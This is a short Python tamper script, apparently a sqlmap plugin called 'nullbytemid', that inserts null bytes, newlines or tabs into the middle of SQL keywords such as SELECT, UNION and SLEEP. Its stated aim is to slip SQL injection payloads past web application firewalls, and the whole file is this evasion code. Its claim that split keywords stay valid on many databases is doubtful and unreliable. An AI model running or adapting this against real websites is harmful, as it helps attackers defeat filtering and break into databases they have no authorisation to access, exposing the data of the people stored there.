#!/usr/bin/env python
# JeevSQL Tamper: nullbytemid - by Jeevraj
# Inserts null bytes mid-keyword to confuse WAF parsers while staying valid on many DBs.
from lib.core.enums import PRIORITY
import random, re

__priority__ = PRIORITY.NORMAL

NULL_VARIANTS = ['\x00', '\x0a', '\x0d', '\x09']
SQL_KEYWORDS = ['SELECT','UNION','FROM','WHERE','AND','OR','LIKE','BETWEEN','NULL','SLEEP',
    'BENCHMARK','VERSION','DATABASE','USER','CHAR','ASCII','CONCAT','INSERT','UPDATE']

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    result = payload
    for kw in SQL_KEYWORDS:
        if kw.lower() in result.lower():
            mid = len(kw) // 2
            def ins_null(m):
                w = m.group(0)
                nb = random.choice(NULL_VARIANTS)
                return w[:mid] + nb + w[mid:]
            result = re.sub(re.escape(kw), ins_null, result, flags=re.IGNORECASE, count=1)
    return result
